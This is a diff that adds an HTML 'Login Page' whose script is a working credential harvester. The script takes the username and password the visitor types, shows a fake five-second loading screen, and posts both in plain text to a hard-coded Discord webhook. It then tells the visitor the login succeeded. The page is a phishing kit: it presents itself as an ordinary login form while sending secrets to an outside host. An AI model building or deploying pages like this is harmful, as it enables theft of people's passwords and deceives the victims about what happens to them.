@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+        }
+
+        #loading {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Login Page</h1>
+    
+    <form id="loginForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required><br>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br>
+
+        <button type="button" onclick="submitForm()">Login</button>
+    </form>
+
+    <div id="loading">Loading...</div>
+
+    <script>
+        function submitForm() {
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // Simulate loading screen
+            document.getElementById("loading").style.display = "block";
+            setTimeout(() => {
+                // Send data to Discord webhook (replace with your actual implementation)
+                sendToDiscordWebhook(username, password);
+
+                // Redirect or perform additional actions after loading
+                alert("Login successful!");
+                document.getElementById("loading").style.display = "none";
+            }, 5000);
+        }
+
+        function sendToDiscordWebhook(username, password) {
+            // Replace this URL with your actual Discord webhook URL
+            const webhookURL = "https://discord.com/api/webhooks/1067461316148744232/wvNCUiK5he2-HXeBwtxTnzJ1Vzt8gtas2n4RrjV23Zs11zwaROsWdhEnaRn4D8JSVejt";
+
+            // Create a data object to send
+            const data = {
+                content: `Login attempt:\nUsername: ${username}\nPassword: ${password}`
+            };
+
+            // Use Fetch API to send data to the webhook
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
